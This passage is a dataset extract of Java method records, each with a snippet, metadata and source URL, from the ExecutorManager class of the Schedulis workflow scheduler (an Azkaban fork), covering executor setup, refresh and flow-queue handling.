"https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34362, "method_name": "getAzkabanProps", "class_name": "ExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Props", "snippet": "  public Props getAzkabanProps() {\n    return this.azkProps;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34363, "method_name": "initialize", "class_name": "ExecutorManager", "params": [], "throws": ["ExecutorManagerException"], "modifiers": [], "return_type": "void", "snippet": "  void initialize() throws ExecutorManagerException {\n    if (this.initialized) {\n      return;\n    }\n    this.initialized = true;\n    this.setupExecutors();\n    this.loadRunningExecutions();\n    this.queuedFlows = new QueuedExecutions(\n        this.azkProps.getLong(ConfigurationKeys.WEBSERVER_QUEUE_SIZE, 100000));\n    this.loadQueuedFlows();\n    this.cacheDir = new File(this.azkProps.getString(\"cache.directory\", \"cache\"));\n    // TODO extract QueueProcessor as a separate class, move all of this into it\n    setupExecutotrComparatorWeightsMap();\n    setupExecutorFilterList();\n    this.queueProcessor = setupQueueProcessor();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34364, "method_name": "start", "class_name": "ExecutorManager", "params": [], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void start() throws ExecutorManagerException {\n    initialize();\n    this.updaterThread.start();\n    this.cleanerThread.start();\n    this.queueProcessor.start();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34365, "method_name": "findApplicationIdFromLog", "class_name": "ExecutorManager", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "  private String findApplicationIdFromLog(final String logData) {\n    final Matcher matcher = APPLICATION_ID_PATTERN.matcher(logData);\n    String appId = null;\n    if (matcher.find()) {\n      appId = matcher.group().substring(12);\n    }\n    ExecutorManager.logger.info(\"Application ID is \" + appId);\n    return appId;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34366, "method_name": "setupQueueProcessor", "class_name": "ExecutorManager", "params": [], "throws": null, "modifiers": ["private"], "return_type": "QueueProcessorThread", "snippet": "  private QueueProcessorThread setupQueueProcessor() {\n    return new QueueProcessorThread(\n        this.azkProps.getBoolean(Constants.ConfigurationKeys.QUEUEPROCESSING_ENABLED, true),\n        this.azkProps.getLong(Constants.ConfigurationKeys.ACTIVE_EXECUTOR_REFRESH_IN_MS, 50000),\n        this.azkProps.getInt(\n            Constants.ConfigurationKeys.ACTIVE_EXECUTOR_REFRESH_IN_NUM_FLOW, 5),\n        this.azkProps.getInt(\n            Constants.ConfigurationKeys.MAX_DISPATCHING_ERRORS_PERMITTED,\n            this.activeExecutors.getAll().size()),\n        this.sleepAfterDispatchFailure);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34367, "method_name": "setupExecutotrComparatorWeightsMap", "class_name": "ExecutorManager", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void setupExecutotrComparatorWeightsMap() {\n    // initialize comparator feature weights for executor selector from azkaban.properties\n    final Map<String, String> compListStrings = this.azkProps\n        .getMapByPrefix(ConfigurationKeys.EXECUTOR_SELECTOR_COMPARATOR_PREFIX);\n    if (compListStrings != null) {\n      this.comparatorWeightsMap = new TreeMap<>();\n      for (final Map.Entry<String, String> entry : compListStrings.entrySet()) {\n        this.comparatorWeightsMap.put(entry.getKey(), Integer.valueOf(entry.getValue()));\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34368, "method_name": "setupExecutorFilterList", "class_name": "ExecutorManager", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void setupExecutorFilterList() {\n    // initialize hard filters for executor selector from azkaban.properties\n    final String filters = this.azkProps\n        .getString(ConfigurationKeys.EXECUTOR_SELECTOR_FILTERS, \"\");\n    if (filters != null) {\n      this.filterList = Arrays.asList(StringUtils.split(filters, \",\"));\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34369, "method_name": "createExecutorInfoRefresherService", "class_name": "ExecutorManager", "params": [], "throws": null, "modifiers": ["private"], "return_type": "ExecutorService", "snippet": "  private ExecutorService createExecutorInfoRefresherService() {\n    return Executors.newFixedThreadPool(this.azkProps.getInt(\n        ConfigurationKeys.EXECUTORINFO_REFRESH_MAX_THREADS, 5));\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34370, "method_name": "setupExecutors", "class_name": "ExecutorManager", "params": [], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void setupExecutors() throws ExecutorManagerException {\n    checkMultiExecutorMode();\n    this.activeExecutors.setupExecutors();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34371, "method_name": "checkMultiExecutorMode", "class_name": "ExecutorManager", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void checkMultiExecutorMode() {\n    if (!this.azkProps.getBoolean(Constants.ConfigurationKeys.USE_MULTIPLE_EXECUTORS, false)) {\n      throw new IllegalArgumentException(\n          Constants.ConfigurationKeys.USE_MULTIPLE_EXECUTORS +\n              \" must be true. Single executor mode is not supported any more.\");\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34372, "method_name": "refreshExecutors", "class_name": "ExecutorManager", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void refreshExecutors() {\n\n    final List<Pair<Executor, Future<ExecutorInfo>>> futures =\n        new ArrayList<>();\n    for (final Executor executor : this.activeExecutors.getAll()) {\n      // execute each executorInfo refresh task to fetch\n      final Future<ExecutorInfo> fetchExecutionInfo =\n          this.executorInfoRefresherService.submit(\n              () -> this.apiGateway.callForJsonType(executor.getHost(),\n                  executor.getPort(), \"/serverStatistics\", null, ExecutorInfo.class));\n      futures.add(new Pair<>(executor,\n          fetchExecutionInfo));\n    }\n\n    boolean wasSuccess = true;\n    for (final Pair<Executor, Future<ExecutorInfo>> refreshPair : futures) {\n      final Executor executor = refreshPair.getFirst();\n      executor.setExecutorInfo(null); // invalidate cached ExecutorInfo\n      try {\n        // max 5 secs\n        final ExecutorInfo executorInfo = refreshPair.getSecond().get(5, TimeUnit.SECONDS);\n        // executorInfo is null if the response was empty\n        executor.setExecutorInfo(executorInfo);\n        logger.info(String.format(\n            \"Successfully refreshed executor: %s with executor info : %s\",\n            executor, executorInfo));\n      } catch (final TimeoutException e) {\n        wasSuccess = false;\n        logger.error(\"Timed out while waiting for ExecutorInfo refresh\"\n            + executor, e);\n      } catch (final Exception e) {\n        wasSuccess = false;\n        logger.error(\"Failed to update ExecutorInfo for executor : \"\n            + executor, e);\n      }\n\n      // update is successful for all executors\n      if (wasSuccess) {\n        this.lastSuccessfulExecutorInfoRefresh = System.currentTimeMillis();\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34373, "method_name": "disableQueueProcessorThread", "class_name": "ExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void disableQueueProcessorThread() {\n    this.queueProcessor.setActive(false);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34374, "method_name": "enableQueueProcessorThread", "class_name": "ExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void enableQueueProcessorThread() {\n    this.queueProcessor.setActive(true);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34375, "method_name": "getQueueProcessorThreadState", "class_name": "ExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "State", "snippet": "  public State getQueueProcessorThreadState() {\n    return this.queueProcessor.getState();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34376, "method_name": "isQueueProcessorThreadActive", "class_name": "ExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isQueueProcessorThreadActive() {\n    return this.queueProcessor.isActive();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34377, "method_name": "getLastSuccessfulExecutorInfoRefresh", "class_name": "ExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "  public long getLastSuccessfulExecutorInfoRefresh() {\n    return this.lastSuccessfulExecutorInfoRefresh;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34378, "method_name": "getAvailableExecutorComparatorNames", "class_name": "ExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Set<String>", "snippet": "  public Set<String> getAvailableExecutorComparatorNames() {\n    return ExecutorComparator.getAvailableComparatorNames();\n\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34379, "method_name": "getAvailableExecutorFilterNames", "class_name": "ExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Set<String>", "snippet": "  public Set<String> getAvailableExecutorFilterNames() {\n    return ExecutorFilter.getAvailableFilterNames();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34380, "method_name": "getExecutorManagerThreadState", "class_name": "ExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "State", "snippet": "  public State getExecutorManagerThreadState() {\n    return this.updaterThread.getState();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34381, "method_name": "getExecutorThreadStage", "class_name": "ExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getExecutorThreadStage() {\n    return this.updaterStage.get();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34382, "method_name": "isExecutorManagerThreadActive", "class_name": "ExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isExecutorManagerThreadActive() {\n    return this.updaterThread.isAlive();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34383, "method_name": "getLastExecutorManagerThreadCheckTime", "class_name": "ExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "  public long getLastExecutorManagerThreadCheckTime() {\n    return this.updaterThread.getLastThreadCheckTime();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34384, "method_name": "getAllActiveExecutors", "class_name": "ExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Collection<Executor>", "snippet": "  public Collection<Executor> getAllActiveExecutors() {\n    return Collections.unmodifiableCollection(this.activeExecutors.getAll());\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34385, "method_name": "fetchExecutor", "class_name": "ExecutorManager", "params": ["int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Executor", "snippet": "  public Executor fetchExecutor(final int executorId) throws ExecutorManagerException {\n    for (final Executor executor : this.activeExecutors.getAll()) {\n      if (executor.getId() == executorId) {\n        return executor;\n      }\n    }\n    return this.executorLoader.fetchExecutor(executorId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34386, "method_name": "getPrimaryServerHosts", "class_name": "ExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Set<String>", "snippet": "  public Set<String> getPrimaryServerHosts() {\n    // Only one for now. More probably later.\n    final HashSet<String> ports = new HashSet<>();\n    for (final Executor executor : this.activeExecutors.getAll()) {\n      ports.add(executor.getHost() + \":\" + executor.getPort());\n    }\n    return ports;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34387, "method_name": "getAllActiveExecutorServerHosts", "class_name": "ExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Set<String>", "snippet": "  public Set<String> getAllActiveExecutorServerHosts() {\n    // Includes non primary server/hosts\n    final HashSet<String> ports = new HashSet<>();\n    for (final Executor executor : this.activeExecutors.getAll()) {\n      ports.add(executor.getHost() + \":\" + executor.getPort());\n    }\n    // include executor which were initially active and still has flows running\n    for (final Pair<ExecutionReference, ExecutableFlow> running : this.runningExecutions.get()\n        .values()) {\n      final ExecutionReference ref = running.getFirst();\n      if (ref.getExecutor().isPresent()) {\n        final Executor executor = ref.getExecutor().get();\n        ports.add(executor.getHost() + \":\" + executor.getPort());\n      }\n    }\n    return ports;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34388, "method_name": "loadRunningExecutions", "class_name": "ExecutorManager", "params": [], "throws": ["ExecutorManagerException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void loadRunningExecutions() throws ExecutorManagerException {\n    logger.info(\"Loading running flows from database..\");\n    final Map<Integer, Pair<ExecutionReference, ExecutableFlow>> activeFlows = this.executorLoader\n        .fetchActiveFlows();\n    logger.info(\"Loaded \" + activeFlows.size() + \" running flows\");\n    this.runningExecutions.get().putAll(activeFlows);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34389, "method_name": "loadQueuedFlows", "class_name": "ExecutorManager", "params": [], "throws": ["ExecutorManagerException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void loadQueuedFlows() throws ExecutorManagerException {\n    final List<Pair<ExecutionReference, ExecutableFlow>> retrievedExecutions =\n        this.executorLoader.fetchQueuedFlows();\n    if (retrievedExecutions != null) {\n      for (final Pair<ExecutionReference, ExecutableFlow> pair : retrievedExecutions) {\n        this.queuedFlows.enqueue(pair.getSecond(), pair.getFirst());\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34390, "method_name": "getRunningFlows", "class_name": "ExecutorManager", "params": ["int", "String"], "throws": null, "modifiers": ["public"], "return_type": "List<Integer>", "snippet": "  public List<Integer> getRunningFlows(final int projectId, final String flowId) {\n    final List<Integer> executionIds = new ArrayList<>();\n    executionIds.addAll(getRunningFlowsHelper(projectId, flowId,\n        this.queuedFlows.getAllEntries()));\n    // it's possible an execution is runningCandidate, meaning it's in dispatching state neither in queuedFlows nor runningFlows,\n    // so checks the runningCandidate as well.\n    if (this.runningCandidate != null) {\n      executionIds\n          .addAll(\n              getRunningFlowsHelper(projectId, flowId, Lists.newArrayList(this.runningCandidate)));\n    }\n    executionIds.addAll(getRunningFlowsHelper(projectId, flowId,\n        this.runningExecutions.get().values()));\n    Collections.sort(executionIds);\n    return executionIds;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34391, "method_name": "getRunningFlowsHelper", "class_name": "ExecutorManager", "params": ["int", "String", "Collection<Pair>"], "throws": null, "modifiers": ["private"], "return_type": "List<Integer>", "snippet": "  private List<Integer> getRunningFlowsHelper(final int projectId, final String flowId,\n      final Collection<Pair<ExecutionReference, ExecutableFlow>> collection) {\n    final List<Integer> executionIds = new ArrayList<>();\n    for (final Pair<ExecutionReference, ExecutableFlow> ref : collection) {\n      if (ref.getSecond().getFlowId().equals(flowId)\n          && ref.getSecond().getProjectId() == projectId) {\n        executionIds.add(ref.getFirst().getExecId());\n      }\n    }\n    return executionIds;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34392, "method_name": "getActiveFlowsWithExecutor", "class_name": "ExecutorManager", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "List<Pair>", "snippet": "  public List<Pair<ExecutableFlow, Optional<Executor>>> getActiveFlowsWithExecutor()\n      throws IOException {\n    final List<Pair<ExecutableFlow, Optional<Executor>>> flows =\n        new ArrayList<>();\n    getActiveFlowsWithExecutorHelper(flows, this.queuedFlows.getAllEntries());\n    getActiveFlowsWithExecutorHelper(flows, this.runningExecutions.get().values());\n\t// FIXME Add run_date date for page display.\n    if(null != flows && !flows.isEmpty()){\n      flows.stream().forEach(pair -> {\n        ExecutableFlow executableFlow = pair.getFirst();\n        Map<String, String> repeatMap = executableFlow.getRepeatOption();\n        if(!repeatMap.isEmpty()){\n\n          Long recoverRunDate = Long.valueOf(String.valueOf(repeatMap.get(\"startTimeLong\")));\n\n          LocalDateTime localDateTime = new LocalDateTime(new Date(recoverRunDate)).minusDays(1);\n\n          Date date = localDateTime.toDate();\n\n          executableFlow.setUpdateTime(date.getTime());\n        }else{\n          Long runDate = executableFlow.getStartTime();\n          if(-1 != runDate){\n            LocalDateTime localDateTime = new LocalDateTime(new Date(runDate)).minusDays(1);\n\n            Date date = localDateTime.toDate();\n\n            executableFlow.setUpdateTime(date.getTime());\n          } else {\n            executableFlow.setUpdateTime(runDate);\n          }\n        }\n      });\n    }\n\n    return flows;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34393, "method_name": "getActiveFlowsWithExecutorHelper", "class_name": "ExecutorManager", "params": ["List<Pair>", "Collection<Pair>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void getActiveFlowsWithExecutorHelper(\n      final List<Pair<ExecutableFlow, Optional<Executor>>> flows,\n      final Collection<Pair<ExecutionReference, ExecutableFlow>> collection) {\n    for (final Pair<ExecutionReference, ExecutableFlow> ref : collection) {\n      flows.add(new Pair<>(ref.getSecond(), ref\n          .getFirst().getExecutor()));\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34394, "method_name": "isFlowRunning", "class_name": "ExecutorManager", "params": ["int", "String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isFlowRunning(final int projectId, final String flowId) {\n    boolean isRunning = false;\n    isRunning =\n        isRunning\n            || isFlowRunningHelper(projectId, flowId, this.queuedFlows.getAllEntries());\n    isRunning =\n        isRunning\n            || isFlowRunningHelper(projectId, flowId, this.runningExecutions.get().values());\n    return isRunning;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34395, "method_name": "isFlowRunningHelper", "class_name": "ExecutorManager", "params": ["int", "String", "Collection<Pair>"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "  private boolean isFlowRunningHelper(final int projectId, final String flowId,\n      final Collection<Pair<ExecutionReference, ExecutableFlow>> collection) {\n    for (final Pair<ExecutionReference, ExecutableFlow> ref : collection) {\n      if (ref.getSecond().getProjectId() == projectId\n          && ref.getSecond().getFlowId().equals(flowId)) {\n        return true;\n      }\n    }\n    return false;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34396, "method_name": "getExecutableFlow", "class_name": "ExecutorManager", "params": ["int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "ExecutableFlow", "snippet": "  public ExecutableFlow getExecutableFlow(final int execId)\n      throws ExecutorManagerException {\n    return this.executorLoader.fetchExecutableFlow(execId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34397, "method_name": "getRunningFlows", "class_name": "ExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> getRunningFlows() {\n    final ArrayList<ExecutableFlow> flows = new ArrayList<>();\n    getActiveFlowHelper(flows, this.queuedFlows.getAllEntries());\n    getActiveFlowHelper(flows, this.runningExecutions.get().values());\n    return flows;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34398, "method_name": "getActiveFlowHelper", "class_name": "ExecutorManager", "params": ["ArrayList<ExecutableFlow>", "Collection<Pair>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void getActiveFlowHelper(final ArrayList<ExecutableFlow> flows,\n      final Collection<Pair<ExecutionReference, ExecutableFlow>> collection) {\n    for (final Pair<ExecutionReference, ExecutableFlow> ref : collection) {\n      flows.add(ref.getSecond());\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34399, "method_name": "getRunningFlowIds", "class_name": "ExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getRunningFlowIds() {\n    final List<Integer> allIds = new ArrayList<>();\n    getRunningFlowsIdsHelper(allIds, this.queuedFlows.getAllEntries());\n    getRunningFlowsIdsHelper(allIds, this.runningExecutions.get().values());\n    Collections.sort(allIds);\n    return allIds.toString();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34400, "method_name": "getQueuedFlowIds", "class_name": "ExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getQueuedFlowIds() {\n    final List<Integer> allIds = new ArrayList<>();\n    getRunningFlowsIdsHelper(allIds, this.queuedFlows.getAllEntries());\n    Collections.sort(allIds);\n    return allIds.toString();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34401, "method_name": "getQueuedFlowSize", "class_name": "ExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "  public long getQueuedFlowSize() {\n    return this.queuedFlows.size();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34402, "method_name": "getRunningFlowsIdsHelper", "class_name": "ExecutorManager", "params": ["List<Integer>", "Collection<Pair>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void getRunningFlowsIdsHelper(final List<Integer> allIds,\n      final Collection<Pair<ExecutionReference, ExecutableFlow>> collection) {\n    for (final Pair<ExecutionReference, ExecutableFlow> ref : collection) {\n      allIds.add(ref.getSecond().getExecutionId());\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34403, "method_name": "getRecentlyFinishedFlows", "class_name": "ExecutorManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> getRecentlyFinishedFlows() {\n    List<ExecutableFlow> flows = new ArrayList<>();\n    try {\n      flows = this.executorLoader.fetchRecentlyFinishedFlows(\n          RECENTLY_FINISHED_LIFETIME);\n    } catch (final ExecutorManagerException e) {\n      //Todo jamiesjc: fix error handling.\n      logger.error(\"Failed to fetch recently finished flows.\", e);\n    }\n\t// FIXME 